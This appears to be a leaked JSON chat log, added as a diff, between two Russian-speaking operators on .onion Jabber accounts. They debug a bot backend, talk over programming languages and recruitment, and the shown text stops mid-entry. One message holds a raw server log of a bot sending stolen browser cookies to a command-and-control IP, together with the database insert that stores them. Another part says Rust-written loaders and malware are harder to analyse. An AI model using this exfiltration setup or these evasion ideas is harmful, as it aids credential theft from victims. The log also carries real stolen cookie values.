@@ -1,0 +1,882 @@
+{
+    "2021-08-27T09:29:17.322472": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    },
+    "2021-08-27T09:52:31.721039": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    },
+    "2021-08-27T09:52:42.221281": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "помоги там плиз с бэком"
+    },
+    "2021-08-27T09:52:47.349214": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "деф говорит ты в курсе проблемы"
+    },
+    "2021-08-27T09:53:03.468160": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "привет да . надо конфу собрать ."
+    },
+    "2021-08-27T09:53:06.923116": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "с клиентским"
+    },
+    "2021-08-27T09:53:34.035025": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "еще можно зайти на сервер где моя програ крутится ?"
+    },
+    "2021-08-27T09:53:58.833250": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "тебе напишет сейчас driver@"
+    },
+    "2021-08-27T09:54:07.760413": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "дальше в рабочем порядке, доступы через дефа"
+    },
+    "2021-08-27T09:54:11.212511": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "конфу соберем"
+    },
+    "2021-08-27T13:42:41.310682": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "слушай"
+    },
+    "2021-08-27T13:42:51.133678": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "ты ведь знаешь протокол HTTP?"
+    },
+    "2021-08-27T13:43:07.405468": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "знаю ) я вообще должен ожидать там чистый текст"
+    },
+    "2021-08-27T13:43:27.375375": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "у меня затруднение со словом \"там\""
+    },
+    "2021-08-27T13:44:02.578681": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а у меня нет ) у меня только затруднения в том . что я не вижу нормального хттп"
+    },
+    "2021-08-27T13:44:10.849111": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "POST / HTTP/1.1\nContent-Type:\nContent-Length:\nContent-Encoding:\nTransfer-Encoding: multipart/form-data"
+    },
+    "2021-08-27T13:44:16.254825": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "далее тело запроса"
+    },
+    "2021-08-27T13:44:25.639586": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "ты что, хочешь сказать что заголовков нет вообще?"
+    },
+    "2021-08-27T13:44:52.648045": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну ты скачал файлы ?"
+    },
+    "2021-08-27T13:44:58.692368": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "скачал"
+    },
+    "2021-08-27T13:45:15.056415": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "в них нет заголовков HTTP"
+    },
+    "2021-08-27T13:45:16.234032": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "бывает нормальные проскакивают .. с POST\nа бывает такие вот как в файлах"
+    },
+    "2021-08-27T13:45:52.766592": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "то есть тебе приходит запрос без заголовков вообще"
+    },
+    "2021-08-27T13:46:01.306363": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "верно?"
+    },
+    "2021-08-27T13:46:36.186020": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну вот ты видел что приходит"
+    },
+    "2021-08-27T13:47:00.083279": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "это конечно очень сильный постмодернизьм, но я могу предположить еще что это HTTP/2.0"
+    },
+    "2021-08-27T13:47:15.697249": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а он там вообще должен быть ?"
+    },
+    "2021-08-27T13:47:16.829900": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "хотя я не помню чтобы хоть один из модулей был переделан на его поддержку"
+    },
+    "2021-08-27T13:47:33.659196": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "он не должен там быть, но я могу предположить почему он там может оказаться"
+    },
+    "2021-08-27T13:47:45.522056": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "например как результат конверсии запроса на прокладке"
+    },
+    "2021-08-27T13:48:06.871998": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну вот в файле good.raw просвечивает http 1.1"
+    },
+    "2021-08-27T13:48:08.689192": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "или потому что кто-то переделал модуль на стек winhttp с включенным http/2 и никому не сказал"
+    },
+    "2021-08-27T13:48:15.490845": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "ну это пиздец"
+    },
+    "2021-08-27T13:48:40.181963": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "а ты можешь прислать хорошие запросы, ты говоришь проскакивает нормальный POST ?"
+    },
+    "2021-08-27T13:48:44.472805": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "так что видно что все норм"
+    },
+    "2021-08-27T13:48:49.807992": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "да могу . щас фильтрану"
+    },
+    "2021-08-27T13:49:57.455915": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я знаешь че думаю"
+    },
+    "2021-08-27T13:50:10.841049": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "что там где POST, Это может быть просто перехват HTTP POST в виде как есть"
+    },
+    "2021-08-27T13:50:18.302518": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "2021-08-27 16:43:08.319 [info] <0.3245.1>@http_handler:handle:20 Path /lib30/NASEEMCASH1_W617601.36CB7F3C9950F33B641F14CB7724D3DB/84/\n2021-08-27 16:43:08.319 [info] <0.3245.1>@http_handler:handle:29 Request for {client,undefined,<<\"NASEEMCASH1_W617601.36CB7F3C9950F33B641F14CB7724D3DB\">>,{3948389396567356219,7214507992180642779},<<\"NASEEMCASH1\">>,<<\"lib30\">>,<<\"windows\">>,<<\"617601\">>,undefined,undefined,<<\"NASEEMCASH1_W617601\">>} <<\"84\">> [<<>>]\n2021-08-27 16:43:08.319 [info] <0.3245.1> Data: <<\"POST /lib30/NASEEMCASH1_W617601.36CB7F3C9950F33B641F14CB7724D3DB/84/ HTTP/1.1\\r\\nAccept: */*\\r\\nContent-Type: multipart/form-data; boundary=---------XTYXAMVRSGLSDPSR\\r\\nConnection: Close\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0)\\r\\nHost: 103.56.207.249:443\\r\\nContent-Length: 90184\\r\\nCache-Control: no-cache\\r\\n\\r\\n-----------XTYXAMVRSGLSDPSR\\r\\nContent-Disposition: form-data; name=\\\"data\\\"\\r\\n\\r\\nQWRtaW5pc3RyYXRvcg==|IE|MjQ2MDU5MTM1LmxvZy5vcHRpbWl6ZWx5LmNvbQ==|ZW5kX3VzZXJfaWQ=|b2V1MTM4ODIxNDM1MzQ3MnIwLjExMDEyMzM5MTYwNjcyODA3|1240428402|1240428402|Lw==\\r\\nQWRtaW5pc3RyYXRvcg==|IE||||1240428288|1240428288|\\r\\nQWRtaW5pc3RyYXRvcg==|IE|M2EyaWxhdGkuY29t|T1hfc2Q=|MQ==|1240428412|1240428412|Lw==\\r\\nQWRtaW5pc3RyYXRvcg==|IE|MzM2NWZjNTU2Y2I1YWQwODdkMTU4YjUyY2I1NTUzNDQxYTlmNjA4NjIzLTEzMjUwMDgzNTM0NGVjZWQ=||X2VtX3Z0|1240428288|1240428288|\\r\\nQWRtaW5pc3RyYXRvcg==|IE|ZTFkNmEyNDUyODU0MGU2ZTQ3ODQ2ODQ4NGQ1YjUzNDRlY2VkYWFjZDg1LTUzODAzMzAzNTM0NGVjZWQ=||X2VtX3Y=|1240428288|1240428288|\\r\\nQWRtaW5pc3RyYXRvcg==|IE|LTE=||X2VtX3N2|1240428288|1240428288|\\r\\nQWRtaW5pc3RyYXRvcg==|IE|MQ==||X2VtX2hs|1240428288|1240428288|\\r\\nQWRtaW5pc3RyYXRvcg==|IE|OTM5NjAxNTkuMTM2NDE3MDI5MS4xMzk3MDI2MDI4LjEzOTcwMjYwMjguMTM5Nz...\">> \n2021-08-27 16:43:17.173 [info] <0.3245.1>@db:equery:46 equery <<\"INSERT INTO data84 (created_at, \\\"group\\\", id_low, id_high, username, browser, \\\"domain\\\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )\">> [<<\"lib30\">>,7214507992180642779,3948389396567356219,<<\"Administrator\">>,<<\"IE\">>,<<\"246059135.log.optimizely.com\">>,<<\"end_user_id\">>,<<\"oeu1388214353472r0.11012339160672807\">>,<<\"1240428402\">>,<<\"1240428402\">>,<<\"/\">>]"
+    },
+    "2021-08-27T13:50:19.729454": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "в смысле, это не заголовки, а это тело )"
+    },
+    "2021-08-27T13:50:29.426050": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "да да"
+    },
+    "2021-08-27T13:50:42.491913": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я хз .. я поставил логирование в самом начале .. т.е. лог показывает то что мне приходит как оно есть"
+    },
+    "2021-09-10T13:20:27.391516": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "привет . .вам Rust разработчик не нужен ? Solana слышал о таком ?"
+    },
+    "2021-09-10T15:39:49.325293": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    },
+    "2021-09-10T15:40:00.543519": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "солана это ник?"
+    },
+    "2021-09-10T17:20:46.005005": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "https://solana.com/\nhttps://habr.com/ru/post/560566/"
+    },
+    "2021-09-10T19:39:28.072951": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "https://solana.com/\nhttps://habr.com/ru/post/560566/"
+    },
+    "2021-09-10T19:40:10.822438": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "возможно нужен"
+    },
+    "2021-09-12T07:28:13.119490": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "возможно нужен"
+    },
+    "2021-09-12T08:40:50.095526": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а конкретнее ?"
+    },
+    "2021-09-13T08:01:30.169011": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а конкретнее ?"
+    },
+    "2021-09-13T12:50:21.743065": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "ку"
+    },
+    "2021-09-13T15:15:49.964779": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "ку"
+    },
+    "2021-09-13T15:32:30.638051": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ку"
+    },
+    "2021-09-14T07:33:28.416089": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ку"
+    },
+    "2021-09-14T07:33:39.984420": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я тут"
+    },
+    "2021-09-14T10:05:14.668704": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я тут"
+    },
+    "2021-09-14T10:05:36.468422": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и я тут .. ты что то писал мне"
+    },
+    "2021-09-14T10:05:45.743080": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "привет"
+    },
+    "2021-09-14T10:05:58.586484": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "нужен скорее по блокчейну человек"
+    },
+    "2021-09-14T10:06:06.349167": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "но там проект идет медленно"
+    },
+    "2021-09-14T10:06:10.985219": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я по нему ноль"
+    },
+    "2021-09-14T10:06:17.853153": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "так твой чел по расту не ноль"
+    },
+    "2021-09-14T10:06:20.461183": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "солана это блокчейн"
+    },
+    "2021-09-14T10:06:37.193147": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я просто хотел начать с Rust что то делать .. вот подумал может есть какие для тебя интересные темы"
+    },
+    "2021-09-14T10:06:51.003326": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "что с отр у тебя?"
+    },
+    "2021-09-14T10:07:29.874625": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": ") да .. так я и говорю .. Солана на расте писана .. соотвественно я растом хочу занятся, ну и чтобы с пользой было -- солану ковырять .\nну а чтобы польза не только мне была ... то ковырять можно с какой то целью"
+    },
+    "2021-09-14T10:07:49.551959": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "> что с отр у тебя?\nне понял вопроса"
+    },
+    "2021-09-14T10:08:25.633744": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "не включается"
+    },
+    "2021-09-14T10:09:22.709012": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я его не ставил"
+    },
+    "2021-09-14T10:09:27.189508": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "забил так сказать"
+    },
+    "2021-09-14T10:12:29.787323": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так что с соланой ?"
+    },
+    "2021-09-14T10:15:04.170123": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "погодь"
+    },
+    "2021-09-14T10:15:12.061243": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "пару мин"
+    },
+    "2021-09-14T10:20:44.932259": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "да не то что с соланой"
+    },
+    "2021-09-14T10:20:47.498681": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я думал уже есть опыт"
+    },
+    "2021-09-14T10:20:57.280979": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "сам по себе раст хорош чтобы лоадеры писать и всякую малварь )"
+    },
+    "2021-09-14T10:21:13.650576": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "т.к. это не С++ и его анализировать хуже, что автоматически что вручную"
+    },
+    "2021-09-14T10:23:09.959576": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "почему хуже ? ) ну тот же асм код"
+    },
+    "2021-09-14T10:23:21.881504": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну может просто средств анализа не так сильно пописано .. ну напишут"
+    },
+    "2021-09-14T10:23:41.995327": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "это уже известный факт"
+    },
+    "2021-09-14T10:23:52.383828": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "малварь писать не хочу .. )"
+    },
+    "2021-09-14T10:23:54.207590": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "rust go nim и даже с#"
+    },
+    "2021-09-14T10:24:25.097124": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "малварь на шарпе -- это как в космос полететь на бейсике .. у него рантайм жирный ) не нужен такой"
+    },
+    "2021-09-14T10:26:35.754731": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так где я могу применить раст у тебя ?"
+    },
+    "2021-09-14T10:26:52.374932": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "в написании малвари"
+    },
+    "2021-09-14T10:27:54.930712": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "дался тебе этот раст"
+    },
+    "2021-09-14T10:28:04.150012": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "это все гогно )"
+    },
+    "2021-09-14T10:28:22.589828": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "гугл продвигает его Линусу, давай чувак пиши пиши ядро на нем"
+    },
+    "2021-09-14T10:28:36.816086": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "а сам ни хера, не использует ни в каких своих проектах )"
+    },
+    "2021-09-14T10:28:43.296599": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "диверсанты хреновы"
+    },
+    "2021-09-14T10:28:52.837132": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "у гугла есть голанг )"
+    },
+    "2021-09-14T10:29:00.265356": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "еще худшее гогно"
+    },
+    "2021-09-14T10:29:03.489254": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "пиздец просто"
+    },
+    "2021-09-14T10:29:08.170751": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а что не гогно ?"
+    },
+    "2021-09-14T10:29:19.347543": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я даже подумать не мог что Ритчи так запомоится"
+    },
+    "2021-09-14T10:29:24.435125": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "Си"
+    },
+    "2021-09-14T10:29:36.280635": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а .. так ты пенсионер сишник )"
+    },
+    "2021-09-14T10:29:44.171139": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я реалист"
+    },
+    "2021-09-14T10:30:01.989526": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так чем тогда гогно раст ?"
+    },
+    "2021-09-14T10:30:15.912485": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "малым пробегом"
+    },
+    "2021-09-14T10:30:38.189263": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "качества самого языка даже неважны, как и для го"
+    },
+    "2021-09-14T10:30:53.398860": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "все проблемы что у меня всплывали были именно с нестабильной и незрелой экосистемой"
+    },
+    "2021-09-14T10:31:17.623444": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "оно все не готово для прода, несмотря на надувание щёк"
+    },
+    "2021-09-14T10:32:22.695655": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а эрланг ?"
+    },
+    "2021-09-14T10:32:41.905550": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я очень мало о нем знаю, спустя столько лет"
+    },
+    "2021-09-14T10:32:53.461336": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "думаю что он очень эффективен"
+    },
+    "2021-09-14T10:33:03.236087": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну ... большой пробег .. но тоже гогно в твоем понимании )"
+    },
+    "2021-09-14T10:33:10.307725": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "нет, он нет"
+    },
+    "2021-09-14T10:33:32.887604": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так а что тогда от вас задач нету по написанию чего то нового  ?"
+    },
+    "2021-09-14T10:33:46.058423": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "причина простая"
+    },
+    "2021-09-14T10:33:57.572986": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "это экзотика, на которую не найти спецов на рынке"
+    },
+    "2021-09-14T10:34:01.964360": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "их тупо нету"
+    },
+    "2021-09-14T10:34:19.049595": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "а на пхп по девять семдесять за килограмм"
+    },
+    "2021-09-14T10:34:43.826197": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "это же кстати относится к любой экзотике - набор людей"
+    },
+    "2021-09-14T10:34:46.457858": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну вот я есть ) а задач нету"
+    },
+    "2021-09-14T10:34:50.313200": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "и к расту и к го"
+    },
+    "2021-09-14T10:35:06.489172": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну .. го уже не экзотика по сравнению с растом .. но меня что то на раст тянет"
+    },
+    "2021-09-14T10:35:32.848446": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "видимо потому что экзотика"
+    },
+    "2021-09-14T10:35:48.461682": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а ближе к пенсии я с хаскелем разберусь ... вот там уж экзотика-экзотик"
+    },
+    "2021-09-14T10:38:50.713559": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так что пишем на эрле нового ? )"
+    },
+    "2021-09-14T10:40:23.959099": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я бы лучше дал задачу тебе обучить людей эрлу"
+    },
+    "2021-09-14T10:41:51.528362": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "вот смотри"
+    },
+    "2021-09-14T10:41:59.177192": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я еще раз повторю про экзотику"
+    },
+    "2021-09-14T10:42:22.530687": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я ведь набираю людей постоянно, сталкиваюсь с законами рынка"
+    },
+    "2021-09-14T10:42:30.993518": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "и я давно в ит, очень давно"
+    },
+    "2021-09-14T10:42:52.578420": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "есть желание разработчиков к новому интересному"
+    },
+    "2021-09-14T10:42:59.750285": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "и есть законы эволюции"
+    },
+    "2021-09-14T10:43:26.504630": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "по законам эволюции, востребованы хорошо проверенные решения, обкатанные временем, от которых отвалилось все лишнее"
+    },
+    "2021-09-14T10:43:34.404180": {
+        "src": "buza@q3mcco35auwcstmt.onion",
